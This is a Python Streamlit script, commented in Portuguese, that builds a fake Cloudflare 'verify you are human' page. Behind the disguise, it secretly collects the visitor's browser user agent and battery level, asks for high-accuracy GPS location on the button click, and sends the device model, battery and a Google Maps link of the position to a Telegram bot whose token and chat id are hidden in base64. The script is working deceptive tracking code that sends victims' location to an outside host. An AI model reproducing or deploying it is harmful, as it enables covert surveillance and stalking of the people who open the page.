import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO DA PÁGINA ---
st.set_page_config(page_title="Verificação de Segurança", page_icon="🔒", layout="centered")

# --- ACESSO DO BOT ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

# --- CSS PARA IMITAR A CLOUDFLARE ---
st.markdown(
    """
    <style>
        .stApp {
            background-color: #000000 !important;
            color: #ffffff !important;
        }
        .main-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .description-text {
            color: #d1d5db;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        .cf-box {
            border: 1px solid #374151;
            background-color: #111827;
            padding: 15px 20px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .cf-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .cf-logo {
            height: 20px;
        }
        .stButton>button {
            background-color: #2563eb;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
        }
        .footer-miamy {
            text-align: center;
            color: #4b5563;
            font-size: 12px;
            font-weight: bold;
            margin-top: 50px;
        }
    </style>
    """,
    unsafe_allow_html=True
)

def enviar_telegram(msg):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat, "text": msg, "parse_mode": "Markdown"}, timeout=15)
    except: pass

# --- ESTADO DE VERIFICAÇÃO ---
if 'check_done' not in st.session_state:
    st.session_state['check_done'] = False

# TÍTULO DA PÁGINA
st.markdown('<div class="main-title">www.verificacaodeseguranca.com.br</div>', unsafe_allow_html=True)

# TEXTO QUE VOCÊ PEDIU (APARECE ASSIM QUE ENTRA)
st.markdown("""
<div class="description-text">
    Este site utiliza um serviço de segurança para proteção contra bots maliciosos. 
    Esta página é exibida enquanto o site verifica se você não é um bot.
</div>
""", unsafe_allow_html=True)

# Coleta técnica em background
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_PRO")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_PRO")

# LÓGICA DE EXIBIÇÃO
if not st.session_state['check_done']:
    # Caixa "Verificando"
    st.markdown("""
    <div class="cf-box">
        <div class="cf-info">
            <span style="color: #3b82f6; font-size: 20px;">🔵</span>
            <span style="font-size: 16px;">Verificando seu navegador...</span>
        </div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
    </div>
    """, unsafe_allow_html=True)

    if st.button("Sou humano. Clique para verificar."):
        # Pede Localização no Clique
        js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true}); })"
        posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_{int(time.time())}")

        if posicao and posicao != "erro":
            # Pega o modelo do celular
            modelo = "Smartphone"
            if ua:
                try:
                    info = ua.split("(")[1].split(")")[0]
                    for p in info.split(";"):
                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "Samsung", "2312"]):
                            modelo = p.strip()
                            break
                except: pass

            link = f"https://www.google.com/maps?q={posicao}"
            relatorio = (
                f"🛡️ *CLOUDFLARE PROTECT*\n"
                f"📱 *Aparelho:* {modelo}\n"
                f"🔋 *Bateria:* {bat if bat else '??'}%\n"
                f"📍 *Local:* {link}"
            )
            enviar_telegram(relatorio)
            st.session_state['check_done'] = True
            st.rerun()

else:
    # TELA DE SUCESSO (CONFORME A SEGUNDA FOTO)
    st.markdown("""
    <div class="cf-box">
        <div class="cf-info">
            <span style="color: #10b981; font-size: 20px;">✅</span>
            <span style="font-size: 16px; color: #10b981;">Verificação bem-sucedida.</span>
        </div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
    </div>
    <div class="description-text" style="font-size: 14px;">
        Aguardando resposta do servidor principal...
    </div>
    """, unsafe_allow_html=True)

# RODAPÉ
st.markdown('<div class="footer-miamy">Desenvolvido Por Miamy © 2026</div>', unsafe_allow_html=True)
